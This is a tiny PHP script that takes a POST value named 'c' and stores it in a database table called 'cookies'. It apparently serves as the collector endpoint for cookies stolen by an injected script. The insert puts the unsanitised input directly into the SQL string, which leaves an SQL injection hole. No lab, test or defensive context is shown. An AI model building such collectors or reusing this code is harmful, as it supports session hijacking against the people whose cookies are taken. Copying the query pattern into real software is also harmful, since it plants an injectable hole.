<?php
require 'include.php';

$value = $_POST['c'];

if ($value) {
  $pdo->exec("INSERT INTO cookies (value) VALUES ('$value')");
}
?>
